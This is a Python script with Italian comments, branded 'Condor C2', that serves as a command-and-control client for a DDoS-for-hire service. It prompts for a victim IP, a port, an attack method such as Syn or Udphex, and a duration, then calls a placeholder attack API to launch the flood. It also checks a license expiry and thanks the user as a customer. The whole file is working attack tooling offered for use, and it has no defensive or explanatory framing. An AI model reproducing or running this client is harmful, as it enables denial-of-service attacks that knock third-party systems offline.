# Dev by Condor
from pprint import pprint
import requests
import os
import time
from datetime import datetime

#Scadenza
scadenza = "31/07/2022"
past = datetime.strptime(scadenza, "%d/%m/%Y")
present = datetime.now()
#metodi e limite di tempo per il ddos
l4methods = ['Plain', 'Std', 'Raw' , 'Syn' , 'Udphex' , 'Greip' , 'Udppush' , 'Udpprand' , 'Kriticos']
limit = 80

#risposta positiva dell'api
correct_response = "{'status': 200, 'success': 'Attack has been launched'}"

#clear per ogni sistema (rilevazione automatica)
def clear():
    os.system('cls' if os.name == 'nt' else 'clear')
#un print per rendere più grafico il C2
def iniziale():
    print("╔═[CONDOR C2]\n\
           ╚════⚫",end="")
#help per i comandi
def help():
    print("scrivi ddos poi inserisci i campi richiesti mano a mano...(piu' facile di cosi)")

#ddos
def ddos():
    metodo = ""
    tempo = 81
    ip = str(input("inserisci ip vittima:"))
    porta = str(input("inserisci porta:"))
    while metodo not in l4methods:
        metodo = input("inserisci metodo:")
        if metodo not in l4methods:
            print("hai inserito un metodo inesistente scegli tra questi:")
            print(l4methods)
        else:
            print("ok!")
    while tempo > limit:
        tempo = int(input("inserisci tempo:"))
        if tempo > limit:
            print("hai inserito un tempo troppo elevato massimo a disposizione: " +limit)
        else:
            print("ok!")
    
    r = requests.get(f'http://url/attacks?key=0000&ip={ip}&port={porta}&method={metodo}&time={tempo}')
    #print(r.json())
    if str(r.json()) == correct_response:
        print("ATTACCO A "+ip+":"+porta+" IN CORSO!!!")
        print("Aspetta il completamento prima di inviare un nuova attacco...")
        time.sleep(tempo)
    else:
        print("ERRORE NEI DATI INSERITI!")
        print("Se il problema persiste contatta l'assistenza...")
        time.sleep(10)

def banner():
    print("\
 _____                 _              _____  _____ \n\
/  __ \               | |            /  __ \/ __  \\\n\
| /  \/ ___  _ __   __| | __ _ _ __  | /  \/`' / /'\n\
| |    / _ \| '_ \ / _` |/ _` | '__| | |      / /  \n\
| \__/\ (_) | | | | (_| | (_| | |    | \__/\./ /___\n\
 \____/\___/|_| |_|\__,_|\__,_|_|     \____/\_____/\n")

##MAIN##
clear()
if not past.date() <= present.date():
    ins =""
    while ins.upper() != "EXIT":
        clear()
        banner()
        iniziale()
        ins = str(input())
        if ins.upper() == "HELP":
            help()
            time.sleep(7)
            continue
        elif ins.upper()=="DDOS":
            ddos()
            continue
        elif ins.upper()=="EXIT":
            print("Grazie per averci scelto!")
            time.sleep(3)
        else:
            print("Comando inesistente... help?")
            time.sleep(2)
            continue
else:
    print("Licenza scaduta!!")